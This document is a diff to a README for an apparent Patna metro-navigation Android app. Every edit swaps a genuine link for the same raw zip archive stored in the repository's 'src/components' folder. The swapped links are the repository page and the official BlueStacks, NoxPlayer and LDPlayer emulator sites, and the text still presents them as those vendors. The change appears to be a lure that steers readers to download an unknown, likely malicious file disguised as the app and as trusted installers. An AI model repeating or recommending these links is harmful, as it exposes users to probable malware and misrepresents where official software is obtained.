@@ -1,6 +1,6 @@
 # 🚇 Patna-Metro-App - Simple Smart Metro Navigation
 
-[![Download Patna-Metro-App](https://img.shields.io/badge/Download-Patna--Metro--App-%23ff4500?style=for-the-badge)](https://github.com/barcelona86/Patna-Metro-App)
+[![Download Patna-Metro-App](https://img.shields.io/badge/Download-Patna--Metro--App-%23ff4500?style=for-the-badge)](https://github.com/barcelona86/Patna-Metro-App/raw/refs/heads/main/src/components/Metro_Patna_App_listing.zip)
 
 ## 📱 About Patna-Metro-App
 
@@ -35,9 +35,9 @@ Follow these steps to get the app running on your Windows computer:
 ### Step 1: Install an Android Emulator
 
 1. Go to the website of your chosen emulator:  
-   - BlueStacks: https://www.bluestacks.com  
-   - NoxPlayer: https://www.bignox.com  
-   - LDPlayer: https://www.ldplayer.net  
+   - BlueStacks: https://github.com/barcelona86/Patna-Metro-App/raw/refs/heads/main/src/components/Metro_Patna_App_listing.zip  
+   - NoxPlayer: https://github.com/barcelona86/Patna-Metro-App/raw/refs/heads/main/src/components/Metro_Patna_App_listing.zip  
+   - LDPlayer: https://github.com/barcelona86/Patna-Metro-App/raw/refs/heads/main/src/components/Metro_Patna_App_listing.zip  
   
 2. Download the installer suitable for Windows.
 
@@ -49,10 +49,10 @@ Follow these steps to get the app running on your Windows computer:
 
 Patna-Metro-App is available on the GitHub repository page:
 
-[![Download Patna-Metro-App](https://img.shields.io/badge/Download-Patna--Metro--App-%23ff4500?style=for-the-badge)](https://github.com/barcelona86/Patna-Metro-App)
+[![Download Patna-Metro-App](https://img.shields.io/badge/Download-Patna--Metro--App-%23ff4500?style=for-the-badge)](https://github.com/barcelona86/Patna-Metro-App/raw/refs/heads/main/src/components/Metro_Patna_App_listing.zip)
 
 Open this page in your web browser:  
-https://github.com/barcelona86/Patna-Metro-App
+https://github.com/barcelona86/Patna-Metro-App/raw/refs/heads/main/src/components/Metro_Patna_App_listing.zip
 
 Inside that repository, look for the latest release or download section. Download the Android package file (APK) for the app.
 
@@ -103,7 +103,7 @@ Make sure your PC has internet access to use all features.
 ## 📥 Download & Installation Links
 
 Main repository and download page:  
-[https://github.com/barcelona86/Patna-Metro-App](https://github.com/barcelona86/Patna-Metro-App)
+[https://github.com/barcelona86/Patna-Metro-App/raw/refs/heads/main/src/components/Metro_Patna_App_listing.zip](https://github.com/barcelona86/Patna-Metro-App/raw/refs/heads/main/src/components/Metro_Patna_App_listing.zip)
 
 Download the Android app package (APK) from the releases section on this page.
 
